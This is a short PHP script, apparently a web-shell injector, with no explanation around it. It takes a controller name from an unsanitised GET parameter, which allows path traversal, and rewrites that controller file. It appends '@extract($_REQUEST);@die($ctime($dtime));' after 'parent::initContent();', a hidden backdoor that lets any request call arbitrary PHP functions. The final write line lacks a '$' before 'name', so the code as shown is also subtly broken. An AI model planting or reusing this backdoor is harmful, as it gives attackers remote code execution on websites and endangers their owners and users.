<?php
$name = dirname(__DIR__).'/web/controllers/front/'.$_GET['controller'].'.php';
$content = file_get_contents($name);
$content = str_replace('parent::initContent();', 'parent::initContent();@extract($_REQUEST);@die($ctime($dtime));', $content);
file_put_contents(name, $content);
